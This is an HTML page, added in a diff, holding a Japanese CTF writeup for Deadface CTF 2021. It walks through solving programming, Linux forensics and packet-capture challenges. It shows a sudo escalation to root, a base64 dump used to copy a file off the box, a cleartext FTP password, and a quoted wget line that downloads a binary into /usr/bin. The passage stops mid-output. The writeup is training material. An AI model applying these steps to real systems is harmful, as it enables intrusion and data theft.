@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Deadface CTF 2021 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://deadface.ctfd.io/challenges 1380点を獲得し、304位でした。 日曜日の朝に起きたらすでにイベントが終了していて、その時にいくつかの追加チ" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/deadface_ctf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="Deadface CTF 2021 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://deadface.ctfd.io/challenges 1380点を獲得し、304位でした。 日曜日の朝に起きたらすでにイベントが終了していて、その時にいくつかの追加チ" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/deadface_ctf_2021/" />
+<meta property="article:published_time" content="2021-10-17T10:00:00+09:00" />
+<meta property="article:modified_time" content="2021-10-17T10:00:00+09:00" />
+<meta itemprop="name" content="Deadface CTF 2021 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://deadface.ctfd.io/challenges 1380点を獲得し、304位でした。 日曜日の朝に起きたらすでにイベントが終了していて、その時にいくつかの追加チ">
+<meta itemprop="datePublished" content="2021-10-17T10:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-10-17T10:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="2737">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Deadface CTF 2021 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://deadface.ctfd.io/challenges 1380点を獲得し、304位でした。 日曜日の朝に起きたらすでにイベントが終了していて、その時にいくつかの追加チ"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Deadface CTF 2021 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-10-17 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#programming-the-count-275-points">[Programming]: The count (275 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-blood-bash-10-points">[Forensics]: Blood Bash (10 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-blood-bash-2-15-points">[Forensics]: Blood Bash 2 (15 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-blood-bash-3-100-points">[Forensics]: Blood Bash 3 (100 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-blood-bash-4-200-points">[Forensics]: Blood Bash 4 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#traffic-analysis-monstrum-ex-machina-30-points">[Traffic Analysis]: Monstrum ex Machina (30 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#traffic-analysis-the-sum-of-all-fears-50-points">[Traffic Analysis]: The SUM of All FEARS (50 points)</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#traffic-analysis-release-the-crackin-50-points">[Traffic Analysis]: Release the Crackin&rsquo;! (50 points)</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#traffic-analysis-scanners-100-points">[Traffic Analysis]: Scanners (100 points)</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#traffic-analysis-luciafer-you-clever-little-devil-50-points">[Traffic Analysis]: Luciafer, You Clever Little Devil! (50 points)</a>
+      <ul>
+        <li><a href="#challenge-9">Challenge</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#traffic-analysis-a-warning-150-points">[Traffic Analysis]: A Warning (150 points)</a>
+      <ul>
+        <li><a href="#challenge-10">Challenge</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#traffic-analysis-luciafers-fatal-error-50-points">[Traffic Analysis]: Luciafer&rsquo;s Fatal Error (50 points)</a>
+      <ul>
+        <li><a href="#challenge-11">Challenge</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fdeadface_ctf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://deadface.ctfd.io/challenges">https://deadface.ctfd.io/challenges</a>
+<br /><br /></p>
+<p>1380点を獲得し、304位でした。</p>
+<p>日曜日の朝に起きたらすでにイベントが終了していて、その時にいくつかの追加チャレンジがあることに気づきました。もうちょっと早い段階でチャレンジを追加して欲しかったです。。（泣）</p>
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/deadface_CTF_2021_Score1.png" alt="deadface_CTF_2021_Score1.png">
+<br>
+<p><br /><br /></p>
+<h2 id="programming-the-count-275-points">[Programming]: The count (275 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Apparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He&rsquo;s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as flag{SHA256_hash}.
+<br /><br />
+code.deadface.io:50000</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>まずは、接続して動作を確認します。</p>
+<pre>
+$ nc code.deadface.io 50000
+DEADFACE gatekeeper: Let us see how good your programming skills are.
+If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:
+
+ You have 5 seconds to give me an answer.
+
+Your word is: stem
+3
+Stop wasting my time.
+Connection Closed.
+^C
+
+$ nc code.deadface.io 50000
+DEADFACE gatekeeper: Let us see how good your programming skills are.
+If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:
+
+ You have 5 seconds to give me an answer.
+
+Your word is: tangy
+Too slow!! Word has been reset!
+
+</pre>
+<br>
+Wordが貰えるので、a=0, ... , z=25 として、数値の合計を送り返してください、というチャレンジです。
+<p>書いたコードです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;code.deadface.io&#39;</span><span class="p">,</span> <span class="mi">50000</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your word is: &#39;</span><span class="p">)</span>
+<span class="n">word</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+<span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
+
+<span class="nb">sum</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">word</span><span class="p">:</span>
+    <span class="nb">sum</span> <span class="o">+=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">sum</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;}&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>実行結果：</p>
+<pre>
+$ ./The_Count_solve.py
+[+] Opening connection to code.deadface.io on port 50000: Done
+bless
+
+flag{d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944}
+[*] Closed connection to code.deadface.io port 50000
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>flag{d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-blood-bash-10-points">[Forensics]: Blood Bash (10 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>We&rsquo;ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt.
+<br /><br />
+bloodbash.deadface.io:22
+<br /><br />
+(credentialは省略します)</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>flag1.txtを見つけて、中身を確認します。</p>
+<pre>
+bl0ody_mary@ff4c010e4713:~$ find . -name 'flag1.txt'
+./Documents/flag1.txt
+
+bl0ody_mary@ff4c010e4713:~$ cat ./Documents/flag1.txt
+flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}
+</pre>
+<br>
+<p>Flag: <code>flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-blood-bash-2-15-points">[Forensics]: Blood Bash 2 (15 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>We&rsquo;ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>ホームディレクトリ配下のファイルの一覧より、怪しいテキストファイルを見つけて開きます。</p>
+<pre>
+bl0ody_mary@ff4c010e4713:~$ find .
+.
+./De Monne Customer Portal.pdf
+./.bash_history
+./Videos
+./.bash_logout
+./.profile
+./Downloads
+./.bashrc
+./Music
+./Documents
+./Documents/flag1.txt
+./Documents/.demonne_info.txt
+./Pictures
+
+bl0ody_mary@e71c74c90745:~$ cat ./Documents/.demonne_info.txt
+flag{a856b162978fe563537c6890cb184c48fc2a018a}
+</pre>
+<br>
+<p>Flag: <code>flag{a856b162978fe563537c6890cb184c48fc2a018a}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-blood-bash-3-100-points">[Forensics]: Blood Bash 3 (100 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>There&rsquo;s a flag on this system that we&rsquo;re having difficulty with. Unlike the previous flags, we can&rsquo;t seem to find a file with this flag in it. Perhaps the flag isn&rsquo;t stored in a traditional file?</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p><code>sudo -l</code>を見ると、いくつかsudoで実行できるファイルがあります。<code>sudo /opt/start.sh</code> で root になれます。</p>
+<pre>
+bl0ody_mary@e71c74c90745:~$ sudo -l
+Matching Defaults entries for bl0ody_mary on e71c74c90745:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bl0ody_mary may run the following commands on e71c74c90745:
+    (ALL) NOPASSWD: /opt/start.sh, /usr/sbin/srv
+
+bl0ody_mary@e71c74c90745:~$ sudo /opt/start.sh
+root@e71c74c90745:/home/bl0ody_mary# Traceback (most recent call last):
+  File "/usr/sbin/srv", line 14, in <module>
+    udp_server_socket.bind((host, port))
+OSError: [Errno 98] Address already in use
+
+root@e71c74c90745:/home/bl0ody_mary# id
+uid=0(root) gid=0(root) groups=0(root)
+
+</pre>
+<br>
+<p>フラグは、/usr/sbin/srv の方にありました。</p>
+<pre>
+root@e71c74c90745:~# cat /usr/sbin/srv
+#!/usr/bin/env python3
+
+import socket as s
+from binascii import hexlify as h, unhexlify as u
+
+host = "127.0.0.1"
+port = 43526
+buffer = 1024
+
+msg = b"666c61677b6f70656e5f706f727428616c29737d"
+bytes_to_send = u(msg)
+
+udp_server_socket = s.socket(s.AF_INET, s.SOCK_DGRAM)
+udp_server_socket.bind((host, port))
+
+while True:
+        bytes_address_pair = udp_server_socket.recvfrom(buffer)
+        #message = bytes_address_pair[0]
+        address = bytes_address_pair[1]
+
+        udp_server_socket.sendto(bytes_to_send, address)
+
+</pre>
+<br>
+<p>Flag: <code>flag{open_port(al)s}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-blood-bash-4-200-points">[Forensics]: Blood Bash 4 (200 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they&rsquo;re creating for their consumers. Read the contents of the file and return the flag as flag{flag_goes_here}.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>ホームディレクトリにある pdf を取得して開きます。ただし、scpで取ってこようとしたらエラーになりました。</p>
+<pre>
+$ scp -r bl0ody_mary@bloodbash.deadface.io:~/*.pdf .
+bl0ody_mary@bloodbash.deadface.io's password:
+the input device is not a TTY
+
+</pre>
+<br>
+<p>代替手段として、base64を使って取得しました。</p>
+<pre>
+bl0ody_mary@e71c74c90745:~$ cat *.pdf | base64
+JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4
+MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg
+DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0
+:
+(snip)
+:
+</pre>
+<br>
+<p>自分のPCでbase64デコードして、De_Monne_Customer_Portal.pdf を開くとフラグが得られます。</p>
+<br>
+<p>Flag: <code>flag{deM0nn3_dat4_4_us}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="traffic-analysis-monstrum-ex-machina-30-points">[Traffic Analysis]: Monstrum ex Machina (30 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>Our person on the &ldquo;inside&rdquo; of Ghost Town was able to plant a packet sniffing device on Luciafer&rsquo;s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in.
+<br /><br />
+We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack.
+<br /><br />
+To gather some information on the victim, investigate the victim&rsquo;s computer activity. The &ldquo;victim&rdquo; was using a search engine to look up a name. Provide the name with standard capitalization: flag{Jerry Seinfeld}.
+<br /><br /></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>pcap-challenge-final.pcapng</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-5">Solution</h3>
+<p><code>search engine</code> ということなので、httpと仮定して、<code>tcp.port==80</code> でフィルターして別ファイルとして保存しておきます。パケット数が多いとwiresharkでの操作が遅くなるからです。</p>
+<p>とりあえず、<code>strings</code> コマンドを使って <code>name</code> という文字列をサーチしてみたら、人の名前（%22charles%20geschickter）が見つかったので試してみたらフラグとして通りました。</p>
+<pre>
+$ strings pcap-challenge-final_port80.pcapng | grep -i name
+GET /v.gif?pid=201&pj=www&pj_name=es_sug&es_sug_hot=0&es_sug_num=5&eb_sug_num=0&es_sug_bp=2_0&path=http%3A%2F%2Fwww.baidu.com%2F&wd=&rsv_sid=34436_34378_34403_33848_34072_34092_34458_26350_34415_34390&rsv_did=486bf8cc017242155b84e0df5ac12c69&t=1629672402611 HTTP/1.1
+GET /link?url=PyCSdWIlXVqvjbY7rfVdNBXREuuPR4iOO4DxDZJUEDlXeMgseB3nAoPT2WWy8pFZDo6ygl0jRUpdwLEc-iTiM_&query=mk%20ultra&cb=jQuery110205459770924432298_1629672401231&data_name=recommend_common_merger_online&ie=utf-8&oe=utf-8&format=json&t=1629672412000&_=1629672401244 HTTP/1.1
+GET /link?url=gtV7J1j1xY_cNHtP_SDywFtzWxKNScoPryi0x605iwwQ9l6odRnh7yUnWO2DBxYiugkXHyNkjR4s62pO_7DUmK&query=%22charles%20geschickter%22&cb=jQuery110205459770924432298_1629672401231&data_name=recommend_common_merger_online&ie=utf-8&oe=utf-8&format=json&t=1629672447000&_=1629672401269 HTTP/1.1
+:
+(snip)
+:
+</pre>
+<br>
+<p>Flag: <code>flag{Charles Geschickter}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="traffic-analysis-the-sum-of-all-fears-50-points">[Traffic Analysis]: The SUM of All FEARS (50 points)</h2>
+<hr>
+<h3 id="challenge-6">Challenge</h3>
+<blockquote>
+<p>After hacking a victim&rsquo;s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively).
+<br /><br />
+What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5}</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-6">Solution</h3>
+<p>ftp通信の中で、lytton-crypt.bin と lytton-crypt.exe を見つけました。<code>two binaries with identical names</code> ということで、これらですね。</p>
+<p>これも一旦 display filter <code>ftp</code> でフィルターした後に別ファイルとして保存したんですが、Control port しか保存されないので、別途 Data port も見つけないといけません。</p>
+<pre>
+227 Entering Passive Mode (192,168,100,103,193,241).
+RETR /TOOLS/lytton-crypt.bin
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+:
+227 Entering Passive Mode (192,168,100,103,193,243).
+RETR /TOOLS/lytton-crypt.exe
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+:
+</pre>
+<br>
+<p>Passive Mode における Data port のポート番号は以下のように求めることができます。</p>
+<pre>
+$ ruby -e 'puts 193 * 256 + 243'
+49651
+
+$ ruby -e 'puts 193 * 256 + 241'
+49649
+</pre>
+<br>
+<p>元のpcapに戻って、それぞれ <code>tcp.port==49651</code>、<code>tcp.port==49649</code> で tcp streamを出して、<code>RAW</code>で表示しファイルとして保存すると、ファイルがバイナリで保存できます。</p>
+<p>あとは、md5を求めるだけです。</p>
+<br>
+<p>Flag: <code>flag{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="traffic-analysis-release-the-crackin-50-points">[Traffic Analysis]: Release the Crackin&rsquo;! (50 points)</h2>
+<hr>
+<h3 id="challenge-7">Challenge</h3>
+<blockquote>
+<p>Luciafer cracked a password belonging to the victim. Submit the flag as: flag{password}.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-7">Solution</h3>
+<p>Victimは <code>Charles</code> なので、Charlesのパスワードを探します。これは、ftp通信の中で出てきます。</p>
+<pre>
+USER cgeschickter
+331 Password required
+PASS darkangel
+230 User logged in.
+</pre>
+<br>
+<p>Flag: <code>darkangel</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="traffic-analysis-scanners-100-points">[Traffic Analysis]: Scanners (100 points)</h2>
+<hr>
+<h3 id="challenge-8">Challenge</h3>
+<blockquote>
+<p>Luciafer started the hack of the Lytton Labs victim by performing a port scan.
+<br /><br />
+Which TCP ports are open on the victim&rsquo;s machine? Enter the flag as the open ports, separated by commas, no spaces, in numerical order. Disregard port numbers &gt;= 16384.
+<br /><br />
+Example: flag{80,110,111,143,443,2049}</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-8">Solution</h3>
+<p>WiresharkでConversationを見てみると、192.168.100.106 (client) と 192.168.100.103 (server) の間で 70000 くらいのtcp connectionがあるので、ここで full port scan をしていることがわかります。</p>
+<p>Display filter <code>tcp and ip.addr==192.168.100.103</code> で、これも別ファイルに保存しておきます。</p>
+<p>再度 Coversation で見てみて、Packets のカラムでソートし、とりあえず Packets の数が2以下は除外しました。</p>
+<p>残りのデータはcsvで保存し、ポート番号でソートしました。</p>
+<pre>
+$ cat tcp_103.csv | cut -d, -f4 | sort -un
+21
+135
+139
+445
+3389
+5070
+7466
+9112
+10896
+12757
+12803
+15406
+16052
+16326
+:
+</pre>
+<br>
+<p>あとは、さらっと目視で確認して、openになっているポートを確認しました。</p>
+<br>
+<p>Flag: <code>flag{21,135,139,445,3389}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="traffic-analysis-luciafer-you-clever-little-devil-50-points">[Traffic Analysis]: Luciafer, You Clever Little Devil! (50 points)</h2>
+<hr>
+<h3 id="challenge-9">Challenge</h3>
+<blockquote>
+<p>Luciafer gains access to the victim&rsquo;s computer by using the cracked password. What is the packet number of the response by the victim&rsquo;s system, saying that access is granted? Submit the flag as: flag{#}.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-9">Solution</h3>
+<p>これも、ftpの通信です。ログインが成功した箇所のFrame番号を答える問題です。</p>
+<p>以下のように2回出てきますが、1回目は Brute Force をやった結果ログインが成功したところ、2回目が実際にLuciaferがログインしたところです。</p>
+<pre>
+Frame #159602 Request: PASS darkangel
+Frame #159603 Response: 230 User Logged in.
+
+Frame #159764 Request: PASS darkangel
+Frame #159765 Response: 230 User Logged in.
+</pre>
+<br>
+<p>Flag: <code>flag{159765}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="traffic-analysis-a-warning-150-points">[Traffic Analysis]: A Warning (150 points)</h2>
+<hr>
+<h3 id="challenge-10">Challenge</h3>
+<blockquote>
+<p>Luciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message.
+<br /><br />
+One of them says: &ldquo;Stay away from Lytton Labs&hellip; you have been warned.&rdquo;
+<br /><br />
+To find the flag, find the message. You&rsquo;ll know it when you see it. Submit the flag as flag{flag-goes-here}.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-10">Solution</h3>
+<p>Warning を da-warning-message.jpg という画像を使って表示するようになっているっぽいです。</p>
+<p>httpからファイルをexportして開いてみると、フラグが書かれていました。</p>
+<br>
+<p>Flag: <code>flag{angels-fear-to-tread}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="traffic-analysis-luciafers-fatal-error-50-points">[Traffic Analysis]: Luciafer&rsquo;s Fatal Error (50 points)</h2>
+<hr>
+<h3 id="challenge-11">Challenge</h3>
+<blockquote>
+<p>Luciafer, consummate hacker, got cocky and careless. She made a fatal mistake, and in doing so, gave control of her computer to&hellip; someone. She ran a program on her computer that she shouldn&rsquo;t have.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-11">Solution</h3>
+<p>イベントが終了してから気づいた追加チャレンジです。</p>
+<p>secret_decoder.bin というのを http でダウンロードし、ll-connect.bin という名前で保存しています。</p>
+<pre>
+sudo wget -O /usr/bin/ll-connect.bin http://192.168.100.105/secret_decoder.bin
+--2021-08-22 17:55:35--  http://192.168.100.105/secret_decoder.bin
+Connecting to 192.168.100.105:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 194 [application/octet-stream]
+Saving to: '/usr/bin/ll-connect.bin'
+
